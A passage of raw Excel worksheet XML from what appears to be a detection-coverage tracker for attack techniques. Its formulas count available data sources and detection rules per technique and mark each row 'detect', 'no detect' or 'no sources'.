        <f t="array" ref="M564">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N564" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O564" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P564" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S56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64" t="s">
        <v>2513</v>
      </c>
      <c r="U564" t="s">
        <v>2650</v>
      </c>
      <c r="V564" t="s">
        <v>2651</v>
      </c>
      <c r="W564" t="b">
        <v>1</v>
      </c>
      <c r="X564" t="s">
        <v>2632</v>
      </c>
    </row>
    <row r="565" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A565" t="s">
        <v>2632</v>
      </c>
      <c r="B565" t="s">
        <v>2652</v>
      </c>
      <c r="C565" t="s">
        <v>2653</v>
      </c>
      <c r="D565" t="s">
        <v>1</v>
      </c>
      <c r="F565" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G565" s="9" cm="1">
        <f t="array" ref="G565">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H565" s="9" t="str" cm="1">
        <f t="array" ref="H565">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I565" s="9" t="str" cm="1">
        <f t="array" ref="I565">IF(SUM(IF($C565=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C565=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J565" s="9" t="str" cm="1">
        <f t="array" ref="J56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65" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M565" s="9" cm="1">
        <f t="array" ref="M565">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N565" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O565" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P565" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S56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65" t="s">
        <v>2513</v>
      </c>
      <c r="U565" t="s">
        <v>2654</v>
      </c>
      <c r="V565" t="s">
        <v>2655</v>
      </c>
      <c r="W565" t="b">
        <v>1</v>
      </c>
      <c r="X565" t="s">
        <v>2632</v>
      </c>
    </row>
    <row r="566" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A566" t="s">
        <v>2632</v>
      </c>
      <c r="B566" t="s">
        <v>2656</v>
      </c>
      <c r="C566" t="s">
        <v>2657</v>
      </c>
      <c r="D566" t="s">
        <v>1</v>
      </c>
      <c r="F566" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G566" s="9" cm="1">
        <f t="array" ref="G566">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H566" s="9" t="str" cm="1">
        <f t="array" ref="H566">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I566" s="9" t="str" cm="1">
        <f t="array" ref="I566">IF(SUM(IF($C566=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C566=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J566" s="9" t="str" cm="1">
        <f t="array" ref="J56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66" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M566" s="9" cm="1">
        <f t="array" ref="M566">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N566" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O566" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P566" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S56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66" t="s">
        <v>2513</v>
      </c>
      <c r="U566" t="s">
        <v>2658</v>
      </c>
      <c r="V566" t="s">
        <v>2659</v>
      </c>
      <c r="W566" t="b">
        <v>1</v>
      </c>
      <c r="X566" t="s">
        <v>2632</v>
      </c>
    </row>
    <row r="567" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A567" t="s">
        <v>2632</v>
      </c>
      <c r="B567" t="s">
        <v>2660</v>
      </c>
      <c r="C567" t="s">
        <v>2661</v>
      </c>
      <c r="D567" t="s">
        <v>1</v>
      </c>
      <c r="F567" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G567" s="9" cm="1">
        <f t="array" ref="G567">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H567" s="9" t="str" cm="1">
        <f t="array" ref="H567">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I567" s="9" t="str" cm="1">
        <f t="array" ref="I567">IF(SUM(IF($C567=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C567=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J567" s="9" t="str" cm="1">
        <f t="array" ref="J56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67" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M567" s="9" cm="1">
        <f t="array" ref="M567">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N567" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O567" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P567" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S56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67" t="s">
        <v>2513</v>
      </c>
      <c r="U567" t="s">
        <v>2662</v>
      </c>
      <c r="W567" t="b">
        <v>1</v>
      </c>
      <c r="X567" t="s">
        <v>2632</v>
      </c>
    </row>
    <row r="568" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A568" t="s">
        <v>2663</v>
      </c>
      <c r="B568" t="s">
        <v>2663</v>
      </c>
      <c r="C568" t="s">
        <v>39</v>
      </c>
      <c r="D568" t="s">
        <v>0</v>
      </c>
      <c r="E568" t="s">
        <v>367</v>
      </c>
      <c r="F568" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G568" s="9" cm="1">
        <f t="array" ref="G568">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H568" s="9" cm="1">
        <f t="array" ref="H568">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I568" s="9" t="str" cm="1">
        <f t="array" ref="I568">IF(SUM(IF($C568=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C568=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J568" s="9" cm="1">
        <f t="array" ref="J56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568" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M568" s="9" cm="1">
        <f t="array" ref="M568">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N568" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O568" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P568" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S56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68" t="s">
        <v>2513</v>
      </c>
      <c r="U568" t="s">
        <v>2664</v>
      </c>
      <c r="V568" t="s">
        <v>2665</v>
      </c>
      <c r="W568" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="569" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A569" t="s">
        <v>2663</v>
      </c>
      <c r="B569" t="s">
        <v>2666</v>
      </c>
      <c r="C569" t="s">
        <v>2667</v>
      </c>
      <c r="D569" t="s">
        <v>0</v>
      </c>
      <c r="F569" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G569" s="9" cm="1">
        <f t="array" ref="G569">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H569" s="9" t="str" cm="1">
        <f t="array" ref="H569">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I569" s="9" t="str" cm="1">
        <f t="array" ref="I569">IF(SUM(IF($C569=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C569=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J569" s="9" t="str" cm="1">
        <f t="array" ref="J56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69" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M569" s="9" cm="1">
        <f t="array" ref="M569">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N569" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O569" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P569" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S56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69" t="s">
        <v>2513</v>
      </c>
      <c r="U569" t="s">
        <v>2668</v>
      </c>
      <c r="V569" t="s">
        <v>2669</v>
      </c>
      <c r="W569" t="b">
        <v>1</v>
      </c>
      <c r="X569" t="s">
        <v>2663</v>
      </c>
    </row>
    <row r="570" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A570" t="s">
        <v>2663</v>
      </c>
      <c r="B570" t="s">
        <v>2670</v>
      </c>
      <c r="C570" t="s">
        <v>2671</v>
      </c>
      <c r="D570" t="s">
        <v>0</v>
      </c>
      <c r="E570" t="s">
        <v>367</v>
      </c>
      <c r="F570" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G570" s="9" cm="1">
        <f t="array" ref="G570">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H570" s="9" t="str" cm="1">
        <f t="array" ref="H570">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I570" s="9" t="str" cm="1">
        <f t="array" ref="I570">IF(SUM(IF($C570=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C570=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J570" s="9" t="str" cm="1">
        <f t="array" ref="J57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70" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M570" s="9" cm="1">
        <f t="array" ref="M570">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N570" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O570" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P570" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S57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70" t="s">
        <v>2513</v>
      </c>
      <c r="U570" t="s">
        <v>2672</v>
      </c>
      <c r="V570" t="s">
        <v>2673</v>
      </c>
      <c r="W570" t="b">
        <v>1</v>
      </c>
      <c r="X570" t="s">
        <v>2663</v>
      </c>
    </row>
    <row r="571" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A571" t="s">
        <v>2663</v>
      </c>
      <c r="B571" t="s">
        <v>2674</v>
      </c>
      <c r="C571" t="s">
        <v>2675</v>
      </c>
      <c r="D571" t="s">
        <v>0</v>
      </c>
      <c r="F571" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G571" s="9" cm="1">
        <f t="array" ref="G571">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H571" s="9" t="str" cm="1">
        <f t="array" ref="H571">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I571" s="9" t="str" cm="1">
        <f t="array" ref="I571">IF(SUM(IF($C571=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C571=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J571" s="9" t="str" cm="1">
        <f t="array" ref="J57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71" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M571" s="9" cm="1">
        <f t="array" ref="M571">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N571" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O571" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P571" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S57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71" t="s">
        <v>2513</v>
      </c>
      <c r="U571" t="s">
        <v>2676</v>
      </c>
      <c r="V571" t="s">
        <v>2669</v>
      </c>
      <c r="W571" t="b">
        <v>1</v>
      </c>
      <c r="X571" t="s">
        <v>2663</v>
      </c>
    </row>
    <row r="572" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A572" t="s">
        <v>2677</v>
      </c>
      <c r="B572" t="s">
        <v>2677</v>
      </c>
      <c r="C572" t="s">
        <v>50</v>
      </c>
      <c r="D572" t="s">
        <v>0</v>
      </c>
      <c r="F572" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G572" s="9" cm="1">
        <f t="array" ref="G572">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H572" s="9" cm="1">
        <f t="array" ref="H572">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>6</v>
      </c>
      <c r="I572" s="9" t="str" cm="1">
        <f t="array" ref="I572">IF(SUM(IF($C572=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C572=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J572" s="9" cm="1">
        <f t="array" ref="J57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572" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>6</v>
      </c>
      <c r="M572" s="9" cm="1">
        <f t="array" ref="M572">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>6</v>
      </c>
      <c r="N572" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O572" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P572" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S57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72" t="s">
        <v>2513</v>
      </c>
      <c r="U572" t="s">
        <v>2678</v>
      </c>
      <c r="V572" t="s">
        <v>2669</v>
      </c>
      <c r="W572" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="573" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A573" t="s">
        <v>2677</v>
      </c>
      <c r="B573" t="s">
        <v>2679</v>
      </c>
      <c r="C573" t="s">
        <v>2680</v>
      </c>
      <c r="D573" t="s">
        <v>0</v>
      </c>
      <c r="F573" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G573" s="9" cm="1">
        <f t="array" ref="G573">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H573" s="9" t="str" cm="1">
        <f t="array" ref="H573">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I573" s="9" t="str" cm="1">
        <f t="array" ref="I573">IF(SUM(IF($C573=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C573=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J573" s="9" t="str" cm="1">
        <f t="array" ref="J57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73" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M573" s="9" cm="1">
        <f t="array" ref="M573">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N573" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O573" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P573" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S57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73" t="s">
        <v>2513</v>
      </c>
      <c r="U573" t="s">
        <v>2681</v>
      </c>
      <c r="V573" t="s">
        <v>2669</v>
      </c>
      <c r="W573" t="b">
        <v>1</v>
      </c>
      <c r="X573" t="s">
        <v>2677</v>
      </c>
    </row>
